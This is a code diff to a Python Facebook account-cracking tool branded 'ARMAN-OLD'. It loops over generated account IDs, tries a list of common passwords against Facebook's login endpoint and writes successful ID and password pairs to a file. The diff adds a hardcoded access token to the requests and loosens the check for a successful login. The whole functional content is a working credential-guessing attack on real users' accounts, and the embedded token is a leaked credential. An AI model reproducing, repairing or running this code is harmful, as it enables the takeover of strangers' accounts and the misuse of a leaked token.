@@ -426,12 +426,6 @@ def show_branding():
 def ____banner____():
     show_branding()
 
-def clear():
-    os.system('clear')
-
-def linex():
-    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-
 def BNG_71_():
     ____banner____()
     print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mOLD CLONE')
@@ -491,15 +485,16 @@ def api_cracking(uid):
     sys.stdout.write(f"\r\r\033[1;37m[ARMAN-OLD] \033[1;36m{loop}\033[1;37m | \033[1;32mOK:{len(oks)}\033[0m")
     sys.stdout.flush()
     try:
+        MY_TOKEN = "EAATlPU5kUrABSLZClswny9YmYedyXN7Tj8kqTcNUYvlZALoEm1zKWSpZAoOgZBoGZAeDBkvB7235BSF8eH1s5F2ZCMWqQ5qdJTZBw2CyLZBHZAZCZBr95vhTdXc4tQBAPZCiUkapZAexD1x4P0OyqEt0IlA6xCjj0C9F2uR3i78B0wJ7SdZAvBZCZAoxPXugV9dtSas5iBvmy6kkvK4E72KjxlMwmagDgJrlhBwoLmwi"
         passwords = ['123456', '12345678', '123456789', 'pakistan', 'khan123', 'samsung', '786786', '12345', 'baazigar']
         for pw in passwords:
             headers = get_smart_headers()
-            url = f"https://b-graph.facebook.com/auth/login?method=GET&format=json&sdk=ios&sdk_version=2&email=10000{uid}&password={pw}&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
+            url = f"https://graph.facebook.com/auth/login?method=GET&format=json&sdk=ios&sdk_version=2&email=10000{uid}&password={pw}&access_token={MY_TOKEN}"
             
             res = requests.get(url, headers=headers, timeout=15)
             data = res.json()
             
-            if "access_token" in data:
+            if "access_token" in data or "uid" in data:
                 print(f"\n\033[1;32m[ARMAN-OK] 10000{uid} | {pw}\033[0m")
                 oks.append(f"10000{uid}|{pw}")
                 with open("arman_ok.txt", "a") as f:
@@ -530,3 +525,4 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"\n\033[1;31m[×] Error: {e}\033[0m")
         sys.exit()
+
